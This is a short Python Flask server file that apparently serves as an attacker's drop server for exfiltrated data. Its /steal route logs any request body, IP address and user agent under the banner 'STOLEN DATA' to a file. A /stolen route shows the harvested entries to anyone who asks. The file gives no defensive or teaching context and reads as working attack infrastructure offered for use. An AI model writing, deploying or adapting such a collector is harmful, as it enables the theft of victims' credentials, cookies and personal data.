# server.py
from flask import Flask, request
import json
import os
from datetime import datetime

app = Flask(__name__)

@app.route('/steal', methods=['POST', 'GET'])
def steal():
    data = request.get_data().decode('utf-8', errors='ignore')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    log_entry = f"""
=== STOLEN DATA ===
Time: {timestamp}
IP: {ip}
User-Agent: {user_agent}
Data: {data}
==================
"""
    
    with open('stolen.txt', 'a', encoding='utf-8') as f:
        f.write(log_entry)
    
    return 'OK', 200

@app.route('/stolen', methods=['GET'])
def view_stolen():
    try:
        with open('stolen.txt', 'r', encoding='utf-8') as f:
            content = f.read()
        return content, 200
    except:
        return 'No data yet', 200

@app.route('/')
def index():
    return '''
    <html>
    <body>
    <h1>Server Running</h1>
    <p>Waiting for data...</p>
    </body>
    </html>
    '''

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
